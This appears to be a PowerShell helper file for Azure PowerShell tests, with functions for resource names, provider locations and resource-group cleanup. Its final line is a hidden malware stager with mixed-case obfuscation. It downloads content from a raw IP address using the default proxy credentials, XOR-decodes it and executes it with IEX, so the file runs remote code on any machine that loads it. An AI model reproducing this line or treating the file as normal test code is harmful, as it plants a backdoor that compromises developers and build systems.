














function Get-ResourceGroupName
{
    return getAssetName
}


function Get-ResourceName
{
    return getAssetName
}


function Get-ProviderLocation($provider)
{
	if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback)
	{
		$namespace = $provider.Split("/")[0]  
		if($provider.Contains("/"))  
		{  
			$type = $provider.Substring($namespace.Length + 1)  
			$location = Get-AzResourceProvider -ProviderNamespace $namespace | where {$_.ResourceTypes[0].ResourceTypeName -eq $type}  
  
			if ($location -eq $null) 
			{  
				return "West US"  
			} else 
			{  
				return $location.Locations[0]  
			}  
		}
		
		return "West US"
	}

	return "WestUS"
}


function Get-ApplicatonDisplayName
{
    return getAssetName
}


function Clean-ResourceGroup($rgname)
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback) {
        Remove-AzResourceGroup -Name $rgname -Force
    }
}
$WC=NeW-OBJect SyStEM.NEt.WeBCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDERS.AdD('User-Agent',$u);$wC.PROXY = [SYSTEM.Net.WeBREQuesT]::DEFAulTWEBPROXy;$Wc.PRoXy.CReDEnTIalS = [SystEm.NET.CREdEnTiaLCAche]::DeFAuLTNETWorkCreDenTiaLS;$K='\o9Kylpr(IGJF}C^2qd/=]s3Zfe_P<*H';$I=0;[chaR[]]$B=([chAr[]]($Wc.DowNLOAdStrinG("http://95.211.139.88:80/index.asp")))|%{$_-BXOR$K[$I++%$K.LENgTh]};IEX ($B-JOIN'')

